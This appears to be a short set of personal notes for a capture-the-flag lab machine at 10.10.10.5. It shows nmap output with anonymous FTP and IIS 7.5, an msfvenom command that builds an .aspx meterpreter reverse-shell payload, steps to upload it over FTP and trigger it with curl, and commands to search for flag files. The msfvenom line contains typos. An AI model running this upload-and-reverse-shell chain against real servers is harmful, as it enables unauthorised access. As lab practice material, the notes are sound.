Possible exploits:
- https://github.com/subonzyx/notes/blob/master/Tutorials/CVE-2010-3972.md


```
# Nmap 7.93 scan initiated Mon Jul 17 19:00:17 2023 as: nmap -p 21,80 -sC -sV -T4 -oA devel-ports 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 17 19:00:30 2023 -- 1 IP address (1 host up) scanned in 13.07 seconds
```

http://10.10.10.5/aspnet_client/

Connect to FTP with anonymous and test `put`

Response from http:
Server: Microsoft-IIS/7.5

Which is aspx based.

```
msfvenom -p windows/meterpeter_reverse_tcp -f aspx -o volt.aspx LHOSTS= PORT=
```

- Start msfconsole and the same payload for receive
- Upload to FTP 
- Trigger with curl <IP>/volt.aspx



After successful connection -> shell

```
whoami
cd\
dir '*user.txt' /s
dir '*root.txt' /s
```